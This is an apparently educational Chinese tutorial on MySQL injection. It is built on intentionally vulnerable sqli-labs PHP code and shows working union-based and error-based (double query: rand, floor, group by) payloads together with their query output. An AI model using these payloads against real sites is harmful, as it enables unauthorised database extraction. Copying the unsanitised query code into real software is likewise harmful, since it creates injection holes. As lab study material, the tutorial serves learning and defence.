

# sql注入

> sql注入，可以说是一个仁者见仁，智者见智的问题。本文从自己思路的角度去为他做一个粗分类

* **0x00 有回显**

  借用sqli-labs里的代码来举例下这种情况

  ```php
  <?php
  //including the Mysql connect parameters.
  include("../sql-connections/sql-connect.php");
  error_reporting(0);
  // take the variables 
  if(isset($_GET['id']))
  {
  $id=$_GET['id'];
  //logging the connection parameters to a file for analysis.
  $fp=fopen('result.txt','a');
  fwrite($fp,'ID:'.$id."\n");
  fclose($fp);

  // connectivity 
  $sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
  $result=mysql_query($sql);
  $row = mysql_fetch_array($result);

  if($row)
  {
    echo "<font size='5' color= '#99FF00'>";
   echo 'Your Login name:'. $row['username'];
   echo "<br>";
   echo 'Your Password:' .$row['password'];
   echo "</font>";
  }
  else 
  {
  	echo '<font color= "#FFFF00">';
  	print_r(mysql_error());
  	echo "</font>";  
  	}
  }
  else { echo "Please input the ID as parameter with numeric value";}

  ?>
  ```

  对于有回显得情况，最直接的就是在回显处注入我们需要的数据像下面这样

  ```mysql
  mysql> select * from users where id='-1'union select version(),database(),user() -- 'limit 0,1;
  +--------+----------+----------------+
  | id     | username | password       |
  +--------+----------+----------------+
  | 5.7.17 | security | root@localhost |
  +--------+----------+----------------+
  1 row in set (0.00 sec)
  ```

  其中要注意：需要使原查询失败（也就是id=-1）；union select的条件（和前查询同数量的列和类型）；闭合sql语句，也就是说id处的单引号和limit前的单引号闭合（这是保证sql语句不能出错，和后面介绍的报错注入有所不同），其中id处的单引号没事好说的单引号配对，双引号配对…，而后面的单引号除了用上面注释的方法（"—+"或者“#”）来忽略掉还可以用下面逻辑注释的方法来注释

  ```mysql
  mysql> select * from users where id='1' and id='2';
  Empty set (0.00 sec)
  #这里的逻辑也可以换为or什么的，也可以写为'2'='2'这种形式
  mysql> select * from users where id='1' and '2';
  +----+----------+----------+
  | id | username | password |
  +----+----------+----------+
  |  1 | Dumb     | Dumb     |
  +----+----------+----------+
  1 row in set (0.00 sec)
  #通过这条语句，可以发现逻辑注释和第一条语句的区别，逻辑的左右是select和'0',而第一条语句是两个id
  mysql> select * from users where id='1' and '0';
  Empty set (0.00 sec)
  ```

  ok来看看如果我们的逻辑注释不是出现在条件（where）中的话会出现什么情况，比如出现在上面的union select中

  ```mysql
  mysql> select * from users where id='-1'union select version(),database(),user()and '1' limit 0,1;
  +--------+----------+----------+
  | id     | username | password |
  +--------+----------+----------+
  | 5.7.17 | security | 0        |
  +--------+----------+----------+
  1 row in set (0.00 sec)
  ```

  发现了把and的两端不再是select和'1'，而是user()和'1'，这样的运算肯定是false了，所以我们最后一条数据就不能显示出来，这也引出了如果返回的输出位有限的话，我们如何去输出超过输出位数据量的数据（或者说我们想要看到最后一位的user()数据），这里也就用到了concat和concat_ws，函数的用法可以help一下，这里不再贴出，看看使用的效果

  ```mysql
  mysql> select * from users where id='-1'union select concat(version(),'~',database(),'~',user()),2,3 and '1' limit 0,1;
  +--------------------------------+----------+----------+
  | id                             | username | password |
  +--------------------------------+----------+----------+
  | 5.7.17~security~root@localhost | 2        | 1        |
  +--------------------------------+----------+----------+
  1 row in set (0.00 sec)

  mysql> select * from users where id='-1'union select concat_ws('~',version(),database(),user()),2,3 and '1' limit 0,1;
  +--------------------------------+----------+----------+
  | id                             | username | password |
  +--------------------------------+----------+----------+
  | 5.7.17~security~root@localhost | 2        | 1        |
  +--------------------------------+----------+----------+
  1 row in set (0.00 sec)
  ```

  目前对带回显得注入理解也就到这了，接下来总结下报错注入

* **0x02 有报错**

  这里主要总结下常见的报错的方法和产生报错的原因，最后可能会尝试下fuzz下新的报错方法，还是第一步贴出有问题的php代码

  ```php
    #这里的代码不再回显数据，而是打印mysql_error，这也就是报错了
    <?php
    //including the Mysql connect parameters.
    include("../sql-connections/sql-connect.php");
    error_reporting(0);
    // take the variables
    if(isset($_GET['id']))
    {
    $id=$_GET['id'];
    //logging the connection parameters to a file for analysis.
    $fp=fopen('result.txt','a');
    fwrite($fp,'ID:'.$id."\n");
    fclose($fp);

    // connectivity 
    $sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
    $result=mysql_query($sql);
    $row = mysql_fetch_array($result);
	if($row)
	{
		echo '<font size="5" color="#FFFF00">';	
    	echo 'You are in...........';
		echo "<br>";
        echo "</font>";
    	}
  	else 
  	{
  	
  	 echo '<font size="3" color="#FFFF00">';
  	 print_r(mysql_error());
  	 echo "</br></font>";	
  	 echo '<font color= "#0000ff" font size= 3>';	
  	
  	}
  }
  	else { echo "Please input the ID as parameter with numeric value";}

  ?>
  ```

1. ##### Double injection（双查询注入）

     首先介绍几个函数：

     * ##### rand()：生成0-1的随机小数，注意在有随机种子rand(0)时生成的随机序列是固定的

     * ##### floor()：对数字往下取整

     * ##### group by：根据by的规则对数据进行分组

     * ##### Count：聚合加动作

    看下报错的语句和效果

    ```mysql
    mysql> select count(*),concat(version(),'+',floor(rand()*2))a from users group by a;
    +----------+----------+
    | count(*) | a        |
    +----------+----------+
    |        8 | 5.7.17+0 |
    |        5 | 5.7.17+1 |
    +----------+----------+
    2 rows in set (0.00 sec)
    
    mysql> select count(*),concat(version(),'+',floor(rand()*2))a from users
    group by a;
    +----------+----------+
    | count(*) | a        |
    +----------+----------+
    |        5 | 5.7.17+0 |
    |        8 | 5.7.17+1 |
    +----------+----------+
    2 rows in set (0.00 sec)
    
    mysql> select count(*),concat(version(),'+',floor(rand()*2))a from users group by a;
    ERROR 1062 (23000): Duplicate entry '5.7.17+1' for key '<group_key>'
    ```
    
    可以发现，我们有一定的<font color=Crimson>几率</font>爆出错来，其实有一定的条件-users的记录数需要 ≥ 2（ rand()生成无序序列 ）或者 ≥ 3（ rand(0)生成序列的 ）。为什么会像上面这样呢？其实在这条语句里concat(…) 做为a并成为group by的规则，那么group by的规则就只有：'5.7.17+0'和'5.7.17+1'，ok规则知道了，那么count是计算过程是怎么样的呢，这里看着上面没保存的结果，think in this way：
    
     #####	取第一条记录时concat的结果为'5.7.17+0' ——> 发现a没有此键值 ——> 向a中添加此记录时会重新计算concat一次的结果为'5.7.17+0'，并把conut(*)自加1
     
     ##### 	取第二条记录时concat的结果为'5.7.17+1' ——> 发现a没有此键值 ——> 向a中添加此记录时重新计算concat一次的结果为'5.7.17+0'，这时想往里添加键值和count(*)自加不同，就会爆错重复的键值
    
     这也解释了为什么在不提供随机种子的情况下，记录数要求 ≥ 2（上面是最小步骤）和为什么报错会是几率性事件：因为在最小步骤出现前如果表里已经出现过两条规则那就不会再报错了，rand()*3,4,5...自行脑补。ps：更详细的解释在这里--[Mysql报错注入原理分析(count()、rand()、group by)](http://mp.weixin.qq.com/s?__biz=MzA5NDY0OTQ0Mw==&mid=403404979&idx=1&sn=27d10b6da357d72304086311cefd573e&scene=1&srcid=04131X3lQlrDMYOCntCqWf6n#wechat_redirect)
     那么其在上面php代码里生效的格式应该是这样的
     ```mysql
     mysql> select * from users where id='1' union select 1,2,3 from (select count(*),concat(floor(rand()*2),version())a from users group by a)b -- ' limit 0,1;
    -> ;
	+----+----------+----------+
	| id | username | password |
	+----+----------+----------+
	|  1 | Dumb     | Dumb     |
	|  1 | 2        | 3        |
	+----+----------+----------+
	2 rows in set (0.00 sec)

	mysql> select * from users where id='1' union select 1,2,3 from (select count(*),concat(floor(rand()*2),version())a from users group by a)b -- ' limit 0,1;
    -> ;
ERROR 1062 (23000): Duplicate entry '05.7.17' for key '<group_key>'

	mysql> select * from users where id='1' and(select 1 from (select count(*),concat(floor(rand()*2),version())a from users group by a)b) -- ' limit 0,1;
    -> ;
ERROR 1062 (23000): Duplicate entry '15.7.17' for key '<group_key>'
     ```